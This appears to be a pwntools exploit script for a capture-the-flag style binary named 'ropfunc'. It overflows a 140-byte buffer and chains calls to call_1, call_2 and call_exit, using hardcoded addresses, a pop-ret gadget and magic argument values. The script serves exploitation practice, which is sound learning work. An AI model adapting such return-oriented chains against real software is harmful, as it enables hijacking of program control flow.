from pwn import *

# gdb-peda pattc + patto
buf_offset = 140
payload = "A" * buf_offset

# nm ./ropfunc |  grep call_1
call1 = p32(0x0804845b)
# Used to pass the check in call_1
param_call1 = p32(0xdeadc0de)
# gdb-peda$ ropgadget - to clean previous param from stack
pop_ret = p32(0x80482e9)

# nm ./ropfunc |  grep call_2
call2 = p32(0x0804847d)
# Params used to pass the checks in call_2
p1_call2 = p32(0xbeefc475)
p2_call2 = p32(0x10101010)
# nm ./ropfunc |  grep call_exit 
cexit = p32(0x0804844b)

# Build ROP chain payload

payload += call1 + pop_ret + param_call1 + call2 + cexit + p1_call2 + p2_call2
print payload
